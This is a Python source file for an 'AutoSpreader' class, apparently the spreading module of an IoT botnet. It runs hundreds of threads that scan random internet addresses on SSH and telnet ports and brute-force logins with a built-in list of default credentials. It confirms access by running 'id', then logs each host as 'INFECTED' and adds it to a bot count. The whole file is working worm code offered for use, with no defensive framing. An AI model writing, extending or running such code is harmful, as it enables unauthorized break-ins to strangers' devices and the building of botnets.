import threading, time, random, socket
from utils.logger import logger

class AutoSpreader:
    def __init__(self, threads=500):
        self.threads = threads
        self.running = False
        self.bot_count = 0
        self.lock = threading.Lock()
        self.creds = [
            ('root', 'admin'), ('admin', 'admin'), ('root', 'root'), ('admin', 'password'),
            ('admin', '1234'), ('guest', 'guest'), ('root', 'password'), ('support', 'support'),
            ('ubnt', 'ubnt'), ('admin', '123456'), ('root', '123456'), ('admin', ''), ('root', '')
        ]
        self.ports = [22, 23]

    def start(self):
        self.running = True
        logger.info(f'AutoSpreader started with {self.threads} workers')
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()

    def stop(self):
        self.running = False
        logger.info('AutoSpreader stopped')

    def _worker(self):
        while self.running:
            ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}'
            for port in self.ports:
                if not self.running:
                    return
                if self._port_open(ip, port):
                    logger.debug(f'Open {ip}:{port}')
                    for user, pwd in self.creds:
                        if not self.running:
                            return
                        if self._try_login(ip, port, user, pwd):
                            logger.info(f'INFECTED {ip}:{port} with {user}:{pwd}')
                            with self.lock:
                                self.bot_count += 1
                            break
            time.sleep(0.001)

    def _port_open(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.05)
        try:
            s.connect((ip, port))
            s.close()
            return True
        except:
            return False

    def _try_login(self, ip, port, user, pwd):
        if port == 22:
            return self._ssh_login(ip, user, pwd)
        if port == 23:
            return self._telnet_login(ip, user, pwd)
        return False

    def _ssh_login(self, ip, user, pwd):
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(ip, port=22, username=user, password=pwd, timeout=3, banner_timeout=3, allow_agent=False, look_for_keys=False)
            c.exec_command('id', timeout=5)
            c.close()
            return True
        except Exception as e:
            logger.debug(f'SSH fail {user}@{ip}: {e}')
            return False

    def _telnet_login(self, ip, user, pwd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, 23))
            # примитивный handshake
            time.sleep(0.2)
            s.recv(1024)
            s.send(user.encode() + b'\n')
            time.sleep(0.2)
            s.recv(1024)
            s.send(pwd.encode() + b'\n')
            time.sleep(0.5)
            s.send(b'id\n')
            time.sleep(0.5)
            out = s.recv(1024)
            s.close()
            return b'uid=' in out
        except Exception as e:
            logger.debug(f'Telnet fail {user}@{ip}: {e}')
            return False

